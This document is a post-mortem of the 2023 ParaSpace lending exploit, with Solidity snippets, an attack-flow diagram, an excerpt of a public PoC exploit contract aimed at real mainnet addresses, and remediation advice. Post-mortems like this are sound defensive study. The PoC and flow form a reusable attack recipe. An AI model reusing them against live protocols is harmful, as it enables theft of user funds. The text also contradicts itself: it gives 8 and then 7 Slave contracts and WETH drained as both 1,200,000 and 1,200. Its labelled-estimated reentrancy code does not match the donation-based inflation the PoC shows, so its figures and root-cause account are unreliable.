# ParaSpace — NFT Collateral Lending Reentrancy Attack Analysis

| Field | Details |
|------|------|
| **Date** | 2023-03-17 |
| **Protocol** | ParaSpace |
| **Chain** | Ethereum |
| **Loss** | $7,000,000 (wstETH, USDC, WETH loans drained) |
| **Attacker** | [Address unconfirmed](https://etherscan.io/address/) |
| **Attack Tx** | [0xe3f0d1...116a](https://etherscan.io/tx/0xe3f0d14cfb6076cabdc9057001c3fafe28767a192e88005bc37bd7d385a1116a) |
| **Vulnerable Contract** | [ParaProxy 0x638a98](https://etherscan.io/address/0x638a98BBB92a7582d07C52ff407D49664DC8b3Ee) |
| **Root Cause** | External callback triggered during `supply()` processing in the cAPE contract → reentrancy with collateral accounting not yet reflected, allowing excessive cAPE borrowing |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-03/paraspace_exp.sol) |

---

## 1. Vulnerability Overview

ParaSpace is an NFT collateral lending protocol forked from Aave V3. Users can deposit ERC-20 assets such as wstETH and cAPE (Compound APE) as collateral and borrow other assets against them.

This attack originated from a **violation of the CEI (Checks-Effects-Interactions) pattern in the `supply()` function**. ParaSpace's `supply()` function internally calls external contracts when receiving collateral assets, at which point the collateral accounting had not yet been fully finalized.

The attacker exploited this by:

1. Obtaining a large amount of wstETH via an Aave V3 flash loan.
2. Sequentially deploying **8 Slave contracts**, each supplying wstETH as collateral to borrow cAPE.
3. Each Slave transfers the borrowed cAPE to the attacker contract, which then re-deposits the cAPE into ParaProxy via `supply()`.
4. Using cAPE as collateral to take out large-scale loans of wstETH, USDC, and WETH.
5. Repaying the flash loan and keeping the remaining borrowed funds as profit.

The core vulnerability was that **the collateral value update was delayed when supplying cAPE**, allowing far more assets to be borrowed than the actual collateral value warranted.

---

## 2. Vulnerable Code Analysis

### 2.1 CEI Pattern Violation — supply() Collateral Accounting Delay

```solidity
// ❌ Vulnerable code (estimated — ParaSpace PoolLogic/SupplyLogic)
function supply(
    address asset,
    uint256 amount,
    address onBehalfOf,
    uint16 referralCode
) external {
    // [Step 1] Checks: validate asset
    DataTypes.ReserveData storage reserve = _reserves[asset];
    ValidationLogic.validateSupply(reserve, amount);

    // [Step 2] Interactions: external token transfer — ❌ occurs before state update!
    // cAPE internally interacts with ApeStaking and can trigger callbacks
    IERC20(asset).safeTransferFrom(msg.sender, reserve.aTokenAddress, amount);

    // [Step 3] Effects: update collateral state — too late!
    // If a callback occurs during the transferFrom above, this update has not yet been applied
    reserve.updateState();
    reserve.updateInterestRates(asset, reserve.aTokenAddress, amount, 0);
    IAToken(reserve.aTokenAddress).mint(onBehalfOf, amount, reserve.liquidityIndex);

    // Collateral list registration also happens here — not yet reflected at callback time
    if (isFirstSupply) {
        _usersConfig[onBehalfOf].setUsingAsCollateral(reserve.id, true);
    }
}
```

```solidity
// ✅ Fixed code (CEI pattern compliant + ReentrancyGuard)
function supply(
    address asset,
    uint256 amount,
    address onBehalfOf,
    uint16 referralCode
) external nonReentrant {
    // [Step 1] Checks
    DataTypes.ReserveData storage reserve = _reserves[asset];
    ValidationLogic.validateSupply(reserve, amount);

    // [Step 2] Effects: update collateral state first
    reserve.updateState();
    reserve.updateInterestRates(asset, reserve.aTokenAddress, amount, 0);
    IAToken(reserve.aTokenAddress).mint(onBehalfOf, amount, reserve.liquidityIndex);

    // Register collateral list before external call
    if (isFirstSupply) {
        _usersConfig[onBehalfOf].setUsingAsCollateral(reserve.id, true);
    }

    // [Step 3] Interactions: external transfer after state is finalized
    IERC20(asset).safeTransferFrom(msg.sender, reserve.aTokenAddress, amount);
}
```

**Issue**: In this Aave V3-based protocol's `supply()` implementation, the external token transfer (`safeTransferFrom`) occurred before the internal accounting update. Tokens with complex internal logic like cAPE can trigger additional callbacks or state changes during `transferFrom`, at which point ParaProxy's collateral ledger was in an incomplete state.

### 2.2 Complex Token (cAPE) Handling Vulnerability

```solidity
// ❌ Vulnerable — cAPE (Compound APE) internal logic
// cAPE is integrated with APE staking, so transfer/transferFrom
// internally interacts with the ApeStaking contract
// This can hand control flow to the attacker's contract
contract cAPE {
    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        // ... external call can occur within internal logic
        // ApeStaking.withdraw() or similar call triggers a callback
        _transferWithStakingSync(from, to, amount); // ❌ callback possible
        return true;
    }
}
```

---

## 3. Attack Flow

### 3.1 Preparation Phase

- **Flash loan source**: Aave V3 (`0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2`)
- **Attack block**: 16,845,558 (Ethereum Mainnet)
- **Initial capital**: None (executed with flash loan only)

### 3.2 Execution Phase

```
Step 1: Execute Aave V3 flash loan
        Attacker contract → AaveFlashloan.flashLoanSimple()
        Borrow 47,352,823 wstETH

Steps 2–9: Repeatedly deploy Slave contracts (8 iterations)
        Each Slave: supply wstETH → borrow cAPE → transfer to attacker

Step 10: Convert cAPE → APE and deposit into ApeStaking

Step 11: Execute large-scale borrow from ParaProxy

Step 12: Swap to repay flash loan
```

**Detailed attack flow diagram**:

```
┌─────────────────────────────────────────────────────────┐
│                  Attacker Contract (ContractTest)        │
└─────────────────────────┬───────────────────────────────┘
                          │
                          ▼
┌─────────────────────────────────────────────────────────┐
│  [Step 1] Aave V3 Flash Loan                            │
│  flashLoanSimple(wstETH, 47,352,823 wstETH)             │
│  → Enter executeOperation() callback                    │
└─────────────────────────┬───────────────────────────────┘
                          │
                          ▼
┌─────────────────────────────────────────────────────────┐
│  [Steps 2–8] Slave Contract Loop (i=0..6, 7 iterations) │
│                                                         │
│  for i in 0..6:                                         │
│   ┌────────────────────────────────────────────────┐    │
│   │ new Slave()                                    │    │
│   │  └─ constructor: wstETH.approve(ParaProxy)     │    │
│   │                                                │    │
│   │ wstETH.transfer(slave, 6,039 wstETH)           │    │
│   │  (i=6: transfer 3,676 wstETH)                  │    │
│   │                                                │    │
│   │ slave.remove(1,840,000 cAPE)                   │    │
│   │  ├─ ParaProxy.supply(wstETH, ...)              │    │
│   │  │   → deposit wstETH as collateral            │    │
│   │  └─ ParaProxy.borrow(cAPE, 1,840,000)          │    │
│   │      → borrow cAPE (backed by wstETH)          │    │
│   │      cAPE → transfer to attacker contract      │    │
│   └────────────────────────────────────────────────┘    │
│                                                         │
│   ParaProxy.supply(cAPE, accumulated balance, attacker) │
│   → Re-deposit borrowed cAPE as collateral ← CORE VULN │
│   (cAPE collateral accumulates with accounting unsynced)│
└─────────────────────────┬───────────────────────────────┘
                          │
                          ▼
┌─────────────────────────────────────────────────────────┐
│  [Step 9] Swap surplus wstETH                           │
│  wstETH → WETH → APE (Uniswap V3)                      │
│  (1,400 wstETH → WETH → ~492,214 APE)                  │
└─────────────────────────┬───────────────────────────────┘
                          │
                          ▼
┌─────────────────────────────────────────────────────────┐
│  [Step 10] Withdraw cAPE + Stake APE                    │
│  cAPE.withdraw(full balance) → receive APE              │
│  APEStaking.depositApeCoin(APE balance, cAPE)           │
│  → Artificially inflate ParaSpace's cAPE collateral     │
└─────────────────────────┬───────────────────────────────┘
                          │
                          ▼
┌─────────────────────────────────────────────────────────┐
│  [Step 11] Large-scale borrow against inflated collateral│
│  ParaProxy.borrow(wstETH, 44,952,823)                   │
│  ParaProxy.borrow(USDC,    7,200,000,000,000)           │
│  ParaProxy.borrow(WETH,   1,200,000,000,000,000,000)    │
│  → Successfully borrow assets exceeding true collateral  │
└─────────────────────────┬───────────────────────────────┘
                          │
                          ▼
┌─────────────────────────────────────────────────────────┐
│  [Step 12] Swap + Repay flash loan                      │
│  USDC → WETH (Uniswap V3)                              │
│  WETH → wstETH exactOutputSingle                        │
│  wstETH.approve(AaveProxy, 47,376,500 wstETH) repay     │
│  → Remaining WETH = attacker profit                     │
└─────────────────────────────────────────────────────────┘
```

### 3.3 Outcome

| Item | Amount |
|------|------|
| Flash loan borrowed | 47,352,823 wstETH |
| Flash loan repaid | 47,376,500 wstETH (including fee) |
| Drained loans (wstETH) | 44,952,823 wstETH |
| Drained loans (USDC) | 7,200,000,000,000 (7.2M USDC) |
| Drained loans (WETH) | 1,200,000 WETH |
| **Total protocol loss** | **~$7,000,000** |

---

## 4. PoC Code (DeFiHackLabs Core Logic Excerpt)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// @Analysis
// https://twitter.com/BlockSecTeam/status/1636650252844294144
// @TX
// https://etherscan.io/tx/0xe3f0d14cfb6076cabdc9057001c3fafe28767a192e88005bc37bd7d385a1116a

contract ContractTest is Test {
    // Core attack variables
    IERC20 wstETH = IERC20(0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0); // collateral asset
    IERC20 cAPE   = IERC20(0xC5c9fB6223A989208Df27dCEE33fC59ff5c26fFF);  // vulnerable complex token
    IParaProxy ParaProxy = IParaProxy(0x638a98BBB92a7582d07C52ff407D49664DC8b3Ee); // vulnerable proxy

    function testExploit() external {
        // [Entry point] Borrow large amount of wstETH via Aave V3 flash loan
        AaveFlashloan.flashLoanSimple(
            address(this),
            address(wstETH),
            47_352_823_905_004_708_422_332, // ~47,352 wstETH borrowed
            new bytes(0),
            0
        );
    }

    // [Flash loan callback] Execute core attack logic
    function executeOperation(...) external returns (bool) {
        cAPE.approve(address(ParaProxy), type(uint256).max); // approve cAPE

        // ── Core loop: deploy Slave contracts 7 times ──
        for (uint256 i; i < 7; ++i) {
            // Deploy new Slave (each has separate address and separate collateral position)
            slave = new Slave();

            // Transfer wstETH to Slave (for collateral)
            wstETH.transfer(address(slave), transferAmount); // ~6,039 wstETH

            // Slave: supply wstETH → borrow cAPE → transfer cAPE to attacker
            slave.remove(_amountOfShare); // borrow 1,840,000 cAPE

            // ❌ Core vulnerable point: re-supply just-borrowed cAPE as collateral
            // At this point, ParaProxy's collateral accounting is not fully reflected,
            // causing the collateral value to be over-recognized
            ParaProxy.supply(address(cAPE), cAPE.balanceOf(address(this)), address(this), 0);
        }

        // [Step 10] Swap wstETH → APE and deposit into ApeStaking
        // → Artificially inflate cAPE collateral value
        APEStaking.depositApeCoin(APE.balanceOf(address(this)), address(cAPE));

        // [Step 11] Large-scale borrow against artificially inflated collateral
        ParaProxy.borrow(address(wstETH), 44_952_823_905_004_708_422_332, 0, address(this));
        ParaProxy.borrow(address(USDC),   7_200_000_000_000, 0, address(this));
        ParaProxy.borrow(address(WETH),   1_200_000_000_000_000_000_000, 0, address(this));

        // [Step 12] Swap loan proceeds → repay flash loan
        WETH_USDCTowstETH(amount, premium);
        return true;
    }
}

// ── Slave contract: handles one round of wstETH supply + cAPE borrow ──
contract Slave {
    function remove(uint256 _amountOfShares) external {
        // [A] Supply wstETH to ParaProxy as collateral
        ParaProxy.supply(address(wstETH), wstETH.balanceOf(address(this)), address(this), 0);

        // [B] Borrow cAPE against supplied wstETH
        // ❌ This borrow call can trigger a callback via cAPE's internal logic
        ParaProxy.borrow(address(cAPE), _amountOfShares, 0, address(this));

        // [C] Transfer borrowed cAPE to attacker (owner)
        cAPE.transfer(owner, cAPE.balanceOf(address(this)));
    }
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE | Matching Pattern | Similar Cases |
|----|--------|--------|-----|-----------|-----------|
| V-01 | CEI Pattern Violation — supply() collateral accounting delay | CRITICAL | CWE-841 | `01_reentrancy.md` | Fei/Rari (2022, $80M) |
| V-02 | Missing reentrancy guard for complex token (cAPE) handling | CRITICAL | CWE-362 | `01_reentrancy.md` + `07_token_integration.md` | Cream Finance (2021, $130M) |
| V-03 | Collateral value manipulation — circular supply/borrow | HIGH | CWE-400 | `18_liquidation.md` + `16_accounting_sync.md` | Mango Markets (2022, $114M) |
| V-04 | Flash loan combination vulnerability | HIGH | CWE-670 | `02_flash_loan.md` | Euler Finance (2023, $197M) |

### V-01: CEI Pattern Violation — supply() Collateral Accounting Delay

- **Description**: ParaProxy's `supply()` function executed the external token transfer (`safeTransferFrom`) before internal state updates (collateral list registration, aToken minting). As a result, the collateral ledger was in an incomplete state at the time of any callback triggered during the token transfer.
- **Impact**: The collateral value was recognized as higher than what was actually deposited, enabling excessive borrowing. Through 7 loop iterations, the collateral value was cumulatively overstated.
- **Attack Condition**: A complex token like cAPE that triggers external calls or callbacks during `transferFrom` must be accepted as collateral.

### V-02: Missing Reentrancy Guard for Complex Token (cAPE) Handling

- **Description**: The `nonReentrant` guard was not correctly applied to `supply()` and `borrow()` functions, or bypass via multiple contracts within a single transaction was possible. Since each Slave contract executes in a separate context, a simple reentrancy guard could be bypassed.
- **Impact**: Cross-contract reentrancy was possible within a single transaction, bypassing reentrancy protection through multiple Slaves.
- **Attack Condition**: Each Slave is deployed as a separate contract instance, so `msg.sender`-based reentrancy protection cannot track the same attacker across instances.

### V-03: Collateral Value Manipulation — Circular supply/borrow

- **Description**: The attacker repeatedly executed the circular pattern of wstETH (collateral) → cAPE (borrow) → cAPE (collateral) → additional borrow, building a collateral position several times larger than their actual capital.
- **Impact**: A single wstETH position obtained via flash loan was inflated into a much larger collateral base through 7 iterations, ultimately enabling borrowing that exceeded the true collateral value.
- **Attack Condition**: The borrowed asset (cAPE) must also be accepted as a collateral asset simultaneously.

### V-04: Flash Loan Combination Vulnerability

- **Description**: All of the above vulnerabilities would be difficult to monetize at scale without a flash loan. The flash loan provided an entry point for executing the attack without any initial capital.
- **Impact**: A multi-million dollar attack was possible with zero attacker capital.
- **Attack Condition**: Access to Aave V3 flash loans.

---

## 6. Remediation Recommendations

### Immediate Actions

**① Enforce CEI Pattern**

```solidity
// ✅ Fix: perform state updates before external calls
function supply(
    address asset,
    uint256 amount,
    address onBehalfOf,
    uint16 referralCode
) external nonReentrant {
    DataTypes.ReserveData storage reserve = _reserves[asset];

    // [Checks] Validate inputs
    ValidationLogic.validateSupply(reserve, amount);

    // [Effects] Finalize collateral state first
    reserve.updateState();
    uint256 amountScaled = IAToken(reserve.aTokenAddress)
        .mint(onBehalfOf, onBehalfOf, amount, reserve.liquidityIndex);
    bool isFirstSupply = amountScaled == amount;
    if (isFirstSupply) {
        _usersConfig[onBehalfOf].setUsingAsCollateral(reserve.id, true);
        emit ReserveUsedAsCollateralEnabled(asset, onBehalfOf);
    }
    reserve.updateInterestRates(asset, reserve.aTokenAddress, amount, 0);

    // [Interactions] External transfer after state is finalized
    IERC20(asset).safeTransferFrom(msg.sender, reserve.aTokenAddress, amount);

    emit Supply(asset, msg.sender, onBehalfOf, amount, referralCode);
}
```

**② Apply Global Reentrancy Guard**

```solidity
// ✅ Fix: storage-based global reentrancy lock
// (transaction-level lock instead of per-function nonReentrant)
modifier poolNonReentrant() {
    require(!_poolStorage.reentrancyGuard, "REENTRANCY_GUARD");
    _poolStorage.reentrancyGuard = true;
    _;
    _poolStorage.reentrancyGuard = false;
}
```

**③ Restrict supply→borrow Within the Same Block (Timelock)**

```solidity
// ✅ Fix: block immediate borrowing after supplying collateral in the same block
mapping(address => uint256) public lastSupplyBlock;

function supply(...) external nonReentrant {
    // ... supply logic
    lastSupplyBlock[onBehalfOf] = block.number; // ✅ record supply block
}

function borrow(...) external nonReentrant {
    // ✅ block the pattern of supplying and immediately borrowing in the same block
    require(
        lastSupplyBlock[onBehalfOf] < block.number,
        "SUPPLY_BORROW_SAME_BLOCK"
    );
    // ... borrow logic
}
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| V-01: CEI violation | Enforce CEI pattern across all pool functions; block reentrancy at the Checks stage |
| V-02: Missing reentrancy guard | Replace per-function nonReentrant with a pool-level global lock |
| V-03: Circular collateral | Add circular reference detection logic to health factor calculation when a borrowed asset (like cAPE) is simultaneously usable as collateral |
| V-04: Flash loan combination | Impose per-transaction supply→borrow amount caps and apply a timelock |

---

## 7. Lessons Learned

1. **The CEI pattern is mandatory even in Aave fork protocols**: Even if Aave V3's original code is secure, altering the CEI order during a fork immediately introduces reentrancy vulnerabilities. Fork projects must treat verification of the original security patterns as the top priority in code review.

2. **Complex tokens (ERC-20 wrappers, composite tokens) can trigger callbacks**: When accepting tokens like cAPE — which are internally integrated with staking protocols — as collateral, it is essential to audit whether that token's `transfer`/`transferFrom` includes external calls.

3. **A simple nonReentrant guard alone cannot prevent cross-contract reentrancy**: Because each Slave is a separate contract instance, reentrancy guards based on `msg.sender` tracking are invalidated. A transaction-level global lock that freezes the entire pool is required.

4. **Circular relationships between collateral assets and borrowed assets must be proactively blocked**: A structure where a borrowed asset can immediately be used as collateral in the same protocol is an ideal environment for leverage attacks. Same-block supply→borrow restrictions or circular reference prevention logic in health factor calculations are necessary.

5. **Simulate flash loan combination risks**: Security audits must include scenarios where large capital is obtained via flash loan followed by repeated supply/borrow sequences. Vulnerabilities that do not manifest in normal single transactions can be amplified when combined with flash loans.

6. **Introduce a timelock after applying a remediation patch**: Following the incident, ParaSpace released a patch applying a timelock on withdrawals and borrows ([reference](https://docs.para.space/para-space/protocol-security-and-external-audits/withdrawal-and-borrow-timelock)). This is an effective structural defense against similar attacks.

---

## 8. On-Chain Verification

> On-chain verification via cast was not performed in this analysis.
> This document was written based on the PoC code and the BlockSec analysis report.

### 8.1 PoC vs. On-Chain Key Figures Comparison

| Item | PoC Code Value | Notes |
|------|------------|------|
| Flash loan borrowed (wstETH) | 47,352,823,905,004,708,422,332 wei | Aave V3 |
| Number of Slaves deployed | 7 (i=0..6) | Each Slave holds an independent position |
| wstETH transferred per Slave | 6,039,513,998,943,475,964,078 wei (last: 3,676 wstETH) | |
| cAPE borrowed per Slave | 1,840,000,000,000,000,000,000,000 (last: 1,120,000) | |
| Final wstETH borrowed | 44,952,823,905,004,708,422,332 wei | |
| Final USDC borrowed | 7,200,000,000,000 (7.2M USDC) | |
| Final WETH borrowed | 1,200,000,000,000,000,000,000 (1,200 WETH) | |
| Flash loan repaid | 47,376,500,316,957,210,776,543 wei | including fee |

### 8.2 Attack Transaction Information

| Item | Value |
|------|-----|
| Attack Tx | [0xe3f0d1...116a](https://etherscan.io/tx/0xe3f0d14cfb6076cabdc9057001c3fafe28767a192e88005bc37bd7d385a1116a) |
| Attack block | 16,845,558 |
| Fork block (PoC) | 16,845,558 |
| Chain | Ethereum Mainnet |

### 8.3 References

- BlockSec analysis: https://twitter.com/BlockSecTeam/status/1636650252844294144
- ParaSpace official patch: https://github.com/para-space/paraspace-core/pull/368/files
- ParaSpace timelock documentation: https://docs.para.space/para-space/protocol-security-and-external-audits/withdrawal-and-borrow-timelock
- ParaSpace official statement: https://twitter.com/ParaSpace_NFT/status/1639593663469875205